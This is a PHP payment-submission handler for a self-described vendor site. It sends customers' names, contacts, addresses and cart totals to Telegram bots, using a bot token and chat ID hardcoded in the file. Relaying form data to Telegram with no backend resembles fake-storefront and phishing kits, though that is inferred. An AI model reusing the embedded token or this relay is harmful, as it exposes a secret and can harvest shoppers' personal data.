<?php
// submit-payment.php - VENDOR WEBSITE VERSION (No database access)

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    session_start();
    
    // Multiple Telegram Bots Configuration
    $telegramBots = [
        [
            'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
            'chat_id' => '1325797388'
        ],
        // Add more bots here as needed
        // [
        //     'token' => 'YOUR_SECOND_BOT_TOKEN',
        //     'chat_id' => 'YOUR_SECOND_CHAT_ID'
        // ],
    ];

    // Collect form data
    $full_name = htmlspecialchars($_POST['full_name']);
    $email = htmlspecialchars($_POST['email']);
    $address = htmlspecialchars($_POST['address']);
    $city = htmlspecialchars($_POST['city']);
    $state = htmlspecialchars($_POST['state']);
    $zip_code = htmlspecialchars($_POST['zip_code']);
    $phone = htmlspecialchars($_POST['phone']);
    $company = htmlspecialchars($_POST['company'] ?? 'N/A');
    
    // Get payment method from session or default
    $payment_method = $_SESSION['selected_payment_method'] ?? 'Not Selected';
    
    // Get cart information from vendor website session
    $cart_count = count($_SESSION['cart'] ?? []);
    $total_price = array_sum(array_column($_SESSION['cart'] ?? [], 'price'));
    $final_total = $total_price * 1.08; // Including tax

    // Create formatted message with emojis
    $message = "💳 NEW EQUIPMENT ORDER PAYMENT SUBMISSION 💳\n\n";
    
    $message .= "👤 CUSTOMER INFORMATION\n";
    $message .= "📛 Full Name: $full_name\n";
    $message .= "📧 Email: $email\n";
    $message .= "📞 Phone: $phone\n";
    $message .= "🏢 Company: $company\n\n";
    
    $message .= "🏠 SHIPPING ADDRESS\n";
    $message .= "📍 Street: $address\n";
    $message .= "🏙️ City: $city\n";
    $message .= "🗺️ State: $state\n";
    $message .= "📮 ZIP Code: $zip_code\n\n";
    
    $message .= "🛒 ORDER SUMMARY\n";
    $message .= "📦 Items in Cart: $cart_count\n";
    $message .= "💰 Subtotal: $" . number_format($total_price, 2) . "\n";
    $message .= "💵 Tax (8%): $" . number_format($total_price * 0.08, 2) . "\n";
    $message .= "💳 Final Total: $" . number_format($final_total, 2) . "\n\n";
    
    $message .= "💸 PAYMENT METHOD\n";
    $message .= "🔗 Selected: $payment_method\n\n";
    
    // Add equipment list
    $message .= "📋 EQUIPMENT PACKAGE INCLUDES:\n";
    foreach ($_SESSION['cart'] as $item) {
        $message .= "• {$item['name']} - $" . number_format($item['price'], 2) . "\n";
    }
    
    $message .= "\n⏰ Order Submitted: " . date('Y-m-d H:i:s');
    $message .= "\n🚚 Estimated Delivery: 1-3 Business Days";
    $message .= "\n📍 Vendor: TechSolutions Pro";
    $message .= "\n🔔 ACTION REQUIRED: Process payment and schedule shipment";

    // Send to ALL Telegram bots
    foreach ($telegramBots as $bot) {
        if (!empty($bot['token']) && !empty($bot['chat_id'])) {
            $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
            $data = [
                'chat_id' => $bot['chat_id'],
                'text' => $message
            ];

            $options = [
                'http' => [
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data),
                    'ignore_errors' => true
                ]
            ];

            @file_get_contents($url, false, stream_context_create($options));
        }
    }

    // Store order information in session for confirmation page (VENDOR WEBSITE ONLY)
    $_SESSION['order_data'] = [
        'full_name' => $full_name,
        'email' => $email,
        'address' => $address,
        'city' => $city,
        'state' => $state,
        'zip_code' => $zip_code,
        'phone' => $phone,
        'company' => $company,
        'payment_method' => $payment_method,
        'order_total' => $final_total,
        'order_date' => date('Y-m-d H:i:s'),
        'order_id' => 'TS' . date('YmdHis') . strtoupper(uniqid())
    ];

    // Redirect to payment confirmation on VENDOR WEBSITE
    header("Location: payment-confirmation.php");
    exit;
} else {
    // Direct access -> redirect to payment page
    header('Location: payment.php');
    exit();
}
?>